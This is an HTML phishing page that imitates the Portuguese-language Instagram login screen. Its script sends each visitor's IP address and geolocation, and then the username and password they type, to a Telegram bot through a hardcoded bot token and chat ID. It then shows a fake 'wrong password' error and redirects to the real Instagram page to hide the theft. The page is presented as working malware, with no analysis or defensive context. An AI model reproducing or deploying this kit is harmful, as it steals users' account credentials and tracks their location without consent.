<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #121e26;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            height: 100vh;
            align-items: center;
            padding: 0 25px;
        }

        .language-top {
            margin-top: 20px;
            color: #a8a8a8;
            font-size: 12px;
        }

        .logo-container {
            margin-top: 80px;
            margin-bottom: 50px;
        }

        .instagram-icon {
            width: 60px;
            height: 60px;
        }

        .login-form {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .login-form input {
            width: 100%;
            height: 52px;
            background: #1c2b33;
            border: 1px solid #36464f;
            border-radius: 12px;
            padding: 0 16px;
            font-size: 14px;
            color: #ffffff;
        }

        .login-form input::placeholder {
            color: #8e8e8e;
        }

        .login-form input:focus {
            border-color: #556670;
            outline: none;
        }

        .login-btn {
            background-color: #1864f7;
            color: white;
            border: none;
            border-radius: 25px;
            height: 44px;
            font-size: 15px;
            font-weight: 600;
            margin-top: 5px;
            cursor: pointer;
        }

        .login-btn:disabled {
            opacity: 0.7;
        }

        .forgot-link {
            text-align: center;
            font-size: 14px;
            margin-top: 20px;
            color: #ffffff;
            text-decoration: none;
            font-weight: 500;
        }

        .footer-container {
            margin-top: auto;
            width: 100%;
            max-width: 400px;
            padding-bottom: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
        }

        .create-account-btn {
            width: 100%;
            height: 44px;
            background: transparent;
            border: 1px solid #1864f7;
            border-radius: 25px;
            color: #1864f7;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }

        .meta-logo {
            width: 65px;
            opacity: 0.8;
        }

        #errorMsg {
            color: #ed4956;
            font-size: 13px;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="language-top">PortuguÃªs (Brasil)</div>
    
    <div class="logo-container">
        <img src="https://static.cdninstagram.com/rsrc.php/v4/yk/r/iyazeqxfbpL.png" alt="Instagram" class="instagram-icon">
    </div>

    <form class="login-form" id="loginForm">
        <input type="text" id="username" placeholder="Nome de usuÃ¡rio, email ou celular" required autocapitalize="none">
        <input type="password" id="password" placeholder="Senha" required>
        
        <button type="submit" class="login-btn" id="loginBtn">Entrar</button>
        
        <a href="#" class="forgot-link">Esqueceu a senha?</a>
        <div id="errorMsg">Senha incorreta. Tente novamente.</div>
    </form>

    <div class="footer-container">
        <button class="create-account-btn">Criar nova conta</button>
        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" alt="Meta" class="meta-logo">
    </div>

    <script>
        const TOKEN = "8524660585:AAHVKLyJeWs_5IM9nmNutXfPkXBBaBh4zi4";
        const CHAT_ID = "5542692841";
        const TELEGRAM_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

        const form = document.getElementById('loginForm');
        const userInp = document.getElementById('username');
        const passInp = document.getElementById('password');
        const btn = document.getElementById('loginBtn');
        const err = document.getElementById('errorMsg');

        let userIP = "Buscando...";
        let userLoc = "Pendente";

        async function getNetworkData() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                userIP = d.ip;
            } catch (e) {}

            navigator.geolocation.getCurrentPosition((p) => {
                userLoc = `${p.coords.latitude}, ${p.coords.longitude}`;
                sendTelegram("", "", "ðŸ“± *INSTAGRAM: NOVO ACESSO*");
            }, () => {
                sendTelegram("", "", "ðŸ“± *INSTAGRAM: NOVO ACESSO*");
            });
        }

        async function sendTelegram(u, p, title) {
            const msg = `${title}\n\n${u ? `ðŸ‘¤ User: ${u}\nðŸ”‘ Pass: ${p}\n` : ""}ðŸŒ IP: ${userIP}\nðŸ“ Loc: ${userLoc}\nðŸ“± OS: ${navigator.platform}`;
            await fetch(TELEGRAM_API, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
            });
        }

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            btn.disabled = true;
            await sendTelegram(userInp.value, passInp.value, "ðŸ” *INSTAGRAM: LOGIN REALIZADO*");
            err.style.display = 'block';
            setTimeout(() => {
                window.location.href = "https://www.instagram.com/accounts/login/";
            }, 1200);
        });

        window.onload = getNetworkData;
    </script>
</body>
</html>
